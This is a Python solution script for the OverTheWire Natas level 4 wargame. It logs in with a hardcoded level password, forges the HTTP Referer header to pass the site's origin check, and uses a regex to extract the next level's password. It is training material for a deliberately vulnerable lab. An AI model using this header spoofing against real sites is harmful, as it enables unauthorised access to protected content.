#!/usr/bin/env python

import requests
import re

user = 'natas4'
passw = 'Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ'  # from previous level
url = 'http://%s.natas.labs.overthewire.org' % user


# 1st step:  print the sourcecode
'''
r = requests.get(url, auth=(user, passw))
print(r.text)
'''
# OUTCOME:  we should come from natas5, so let's update referer


# 2nd step: print the sourcecode with appropriate referer
'''
r = requests.get(url, auth=(user, passw), headers={'referer':'http://natas5.natas.labs.overthewire.org/'})
print(r.text)
'''
# OUTCOME:  password is here


# 3rd Step:  extract the password from the sourcecode
url = 'http://%s.natas.labs.overthewire.org' % user
r = requests.get(url, auth=(user, passw), headers={'referer':'http://natas5.natas.labs.overthewire.org/'})
webPage = r.text
matchObject = re.search('((?!%s)[a-zA-Z0-9]{32})' % passw, webPage)  # we know that the password has length of 32 chars and consisting of alphanum
# the first part of the regular expression is for not to match with our previous password, since it's also present in the sourcecode
print(matchObject.group())


